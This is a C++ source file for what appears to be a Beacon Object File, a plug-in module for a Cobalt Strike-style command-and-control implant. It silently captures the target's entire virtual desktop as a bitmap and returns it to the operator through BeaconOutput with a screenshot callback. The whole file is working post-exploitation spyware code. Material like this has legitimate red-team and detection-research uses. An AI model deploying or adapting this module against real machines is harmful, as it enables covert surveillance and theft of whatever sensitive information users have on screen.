#include <general.h>

auto CaptureScreenshot( VOID ) -> VOID {
    auto VirtualLeft   = LONG{ 0 };
    auto VirtualTop    = LONG{ 0 };
    auto VirtualRight  = LONG{ 0 };
    auto VirtualBottom = LONG{ 0 };

    auto DevCtx   = HDC{ nullptr };
    auto MmDevCtx = HDC{ nullptr };
    auto BmSect   = HBITMAP{ nullptr };
    auto OldBitmap = HBITMAP{ nullptr };
    auto BitsBuff  = PVOID{ nullptr };
    auto BitsPtr   = PVOID{ nullptr };
    auto BitsSize  = UINT32{ 0 };
    auto TotalSize = UINT32{ 0 };

    auto Cleanup = [&]() -> VOID {
        if ( BitsPtr ) {
            free( BitsPtr );
            BitsPtr = nullptr;
        }

        if ( OldBitmap && MmDevCtx ) {
            SelectObject( MmDevCtx, OldBitmap );
        }
        if ( BmSect   ) DeleteObject( BmSect );
        if ( MmDevCtx ) DeleteDC( MmDevCtx );
        if ( DevCtx   ) ReleaseDC( nullptr, DevCtx );

        return;
    };

    VirtualLeft   = GetSystemMetrics( SM_XVIRTUALSCREEN );
    VirtualTop    = GetSystemMetrics( SM_YVIRTUALSCREEN );
    VirtualRight  = GetSystemMetrics( SM_CXVIRTUALSCREEN );
    VirtualBottom = GetSystemMetrics( SM_CYVIRTUALSCREEN );

    auto VirtualWidth  = VirtualRight;
    auto VirtualHeight = VirtualBottom;

    if ( VirtualWidth <= 0 || VirtualHeight <= 0 ) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid virtual screen size");
        return;
    }


    DevCtx = GetDC( nullptr );
    if ( ! DevCtx ) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetDC failed: %d", GetLastError());
        return;
    }

    MmDevCtx = CreateCompatibleDC( DevCtx );
    if ( ! MmDevCtx ) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateCompatibleDC failed: %d", GetLastError());
        return Cleanup();
    }

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth       = VirtualWidth;
    bmi.bmiHeader.biHeight      = -VirtualHeight; 
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    BmSect = CreateDIBSection( DevCtx, &bmi, DIB_RGB_COLORS, &BitsBuff, nullptr, 0 );
    if ( ! BmSect || ! BitsBuff ) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateDIBSection failed: %d", GetLastError());
        return Cleanup();
    }

    OldBitmap = (HBITMAP)SelectObject( MmDevCtx, BmSect );
    if ( ! OldBitmap || OldBitmap == HGDI_ERROR ) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SelectObject failed: %d", GetLastError());
        return Cleanup();
    }

    if ( ! BitBlt( MmDevCtx, 0, 0, VirtualWidth, VirtualHeight, DevCtx, VirtualLeft, VirtualTop, SRCCOPY ) ) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BitBlt failed: %d", GetLastError());
        return Cleanup();
    }

    GdiFlush();

    INT32 RowBytes = ((VirtualWidth * 32 + 31) / 32) * 4;
    BitsSize = RowBytes * VirtualHeight;

    BITMAPFILEHEADER bfh = { 0 };
    bfh.bfType    = 0x4D42;
    bfh.bfOffBits = ( sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) );
    bfh.bfSize    = bfh.bfOffBits + BitsSize;

    BITMAPINFOHEADER bih = { 0 };
    bih.biSize        = sizeof( BITMAPINFOHEADER );
    bih.biWidth       = VirtualWidth;
    bih.biHeight      = -VirtualHeight;
    bih.biPlanes      = 1;
    bih.biBitCount    = 32;
    bih.biCompression = BI_RGB;
    bih.biSizeImage   = BitsSize;

    TotalSize = ( sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) + BitsSize );
    BitsPtr   = malloc( TotalSize );
    if ( ! BitsPtr ) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory");
        return Cleanup();
    }

    PBYTE pCurrent = (PBYTE)BitsPtr;
    memcpy(pCurrent, &bfh, sizeof(bfh));
    pCurrent += sizeof(bfh);
    memcpy(pCurrent, &bih, sizeof(bih));
    pCurrent += sizeof(bih);
    memcpy(pCurrent, BitsBuff, BitsSize);

    BeaconOutput(CALLBACK_SCREENSHOT, (CHAR*)BitsPtr, TotalSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Screenshot sent (total: %dx%d)", VirtualWidth, VirtualHeight);

    return Cleanup();
}

EXTERN_C auto go( CHAR* Args, INT32 Argc ) -> VOID {
    return CaptureScreenshot();
}
